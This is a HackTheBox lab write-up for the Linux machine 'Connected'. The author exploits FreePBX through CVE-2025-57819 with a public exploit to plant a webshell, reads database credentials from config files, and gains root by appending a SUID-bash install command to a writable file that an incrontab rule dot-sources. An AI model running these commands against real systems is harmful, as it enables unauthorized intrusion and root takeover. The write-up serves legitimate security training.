---
title: HackTheBox - Connected
date: 2026-11-03
image: cover.png
tags: [HackTheBox, Easy, Linux]
platform: HackTheBox
os: Linux
difficulty: Easy
points: 45
released: 2026-06-06
ip: 10.129.245.100
boxAvatar: htb-cover.png
excerpt: An easy Linux box running FreePBX. An unauthenticated SQL injection (CVE-2025-57819) lets a public exploit inject a new administrator and drop a webshell, giving a foothold as asterisk. Its own config files leak database credentials, but the real path to root is an incrontab rule that dot-sources a world-writable config file whenever a sysadmin script runs - appending an install command to it plants a root-owned SUID shell.
active: "Password123!"
---

# Connected

Connected is an easy-rated Linux machine running FreePBX, the open-source Asterisk-based phone system. The foothold is a known unauthenticated SQL injection that a public exploit turns straight into remote code execution, landing a shell as the `asterisk` service account. Root comes from something far less obvious than the usual SUID binary or sudo rule: an `incrontab` entry that watches a sysadmin script and re-runs it on any write, and that script dot-sources a configuration file the `asterisk` user can edit. Every credential, hash, and IP below belongs to the lab and has no meaning outside of it.

### NMAP Scanning

The certificate body below is trimmed to its metadata.

```bash
PORT    STATE SERVICE   REASON         VERSION
22/tcp  open  ssh       syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http      syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| http-title: 404 Not Found
|_Requested resource was config.php
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/https syn-ack ttl 63 Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization
| Issuer: commonName=pbxconnect/organizationName=SomeOrganization
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-30T14:07:27
| Not valid after:  2026-11-30T14:07:27
| -----BEGIN CERTIFICATE-----
| [ ... certificate body trimmed for readability ... ]
|_-----END CERTIFICATE-----
```

Old software across the board: OpenSSH 7.4, Apache 2.4.6 and PHP 7.4.16 on CentOS, redirected at a `config.php` that doesn't exist at the root - a strong hint this is a PHP application, and the `pbxconnect` common name all but names it.

### SSH - Banner Grabbing

→ Command: `nc -vn 10.129.245.100 22`

{% image %}

```bash
➜  connected nc -vn 10.129.245.100 22
(UNKNOWN) [10.129.245.100] 22 (ssh) open
SSH-2.0-OpenSSH_7.4
```

### Web Server Enumeration

A plain `curl -i` against the IP shows a redirect to `connected.htb`:

{% image2 %}

We add it to `/etc/hosts`:

```bash
➜  connected cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.129.245.100	connected.htb
```

The site is a FreePBX instance:

{% image3 %}

Its version carries several known CVEs, the most serious of which is an unauthenticated SQL injection that leads to RCE - `CVE-2025-57819`, affecting FreePBX 16 below 16.0.89, which lets an attacker inject a new administrator straight into the `ampusers` table:

{% image4 %}

A public exploit for it already exists, from watchTowr Labs: [watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819](https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819). The page responds slowly over the VPN, so before running it we drop `tun0`'s MTU from 1500 to 1200 to avoid fragmentation issues:

```bash
ip link show tun0
```

{% image5 %}

```bash
sudo ip link set dev tun0 mtu 1200
```

{% image6 %}

### FreePBX - Remote Code Execution

Cloning the exploit and running it against the target plants a webshell:

→ Command: `python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H https://connected.htb/`

{% image7 %}

Requesting the webshell with a command parameter confirms code execution:

{% image8 %}

That shell runs as `asterisk`, so we create a `.ssh` directory for it and drop our public key into `authorized_keys`:

{% image9 %}

With a stable SSH session in place, we grab the user flag and move on to privilege escalation.

### Privilege Escalation - Pillaging and Situational Awareness

Checking local listeners shows several services bound to localhost:

→ Command: `netstat -tulpn`

{% image10 %}

FreePBX keeps its own secrets in `/etc/freepbx.conf` and `/etc/amportal.conf`, both readable as `asterisk`:

{% image11 %}

The database credentials from those files get us into MySQL:

{% image12 %}

Looking for tables with "user" in the name:

```bash
MariaDB [asterisk]> SHOW TABLES LIKE '%user%';
```

{% image13 %}

`ampusers` is the one that matters - it holds a SHA hash of the admin password:

{% image14 %}

It doesn't crack, though:

{% image15 %}

### Incrontab

Running `linpeas` turns up something more promising:

{% image16 %}

Further down, an `incrontab` listing - rules that re-run a command whenever a watched file is written to, created or has its attributes changed:

```bash
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

{% image17 %}

All of these run as root - that's how `incrontab` normally works for root-owned watches. `/usr/sbin/sysadmin_dahdi_restart` is the interesting one: touching `/var/spool/asterisk/sysadmin/dahdi_restart` makes it stop Asterisk and then restart `dahdi`:

{% image18 %}

Looking at the restart script itself:

```bash
-bash-4.2$ grep -n "init.conf" /etc/init.d/dahdi
9:# config: /etc/dahdi/init.conf
25:# Don't edit the following values. Edit /etc/dahdi/init.conf instead.
69:[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
-bash-4.2$
```

Line 69 dot-sources `/etc/dahdi/init.conf` - its contents run inline, in the same root shell, as if they'd been typed directly. And that file turns out to be owned by `asterisk`, writable by the very user our webshell runs as:

{% image19 %}

So we append an install command to it and trigger the watched rule by touching the file `incrontab` is watching:

```bash
printf '\n install -m 4755 /bin/bash /home/asterisk/pwnage \n' >> /etc/dahdi/init.conf
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

A few seconds later, a root-owned SUID copy of bash appears:

{% image20 %}

```bash
./pwnage -p
```

That drops us into a root shell, where we can read the final flag:

{% image21 %}

Connected is a good lesson in not stopping once a web exploit lands a shell. The obvious privilege-escalation leads here - readable config files, a crackable password hash - both go nowhere. The real path is a maintenance mechanism nobody thought to lock down: a root-triggered watch on a file an unprivileged service account could edit, which turns any write to that file into arbitrary code running as root.
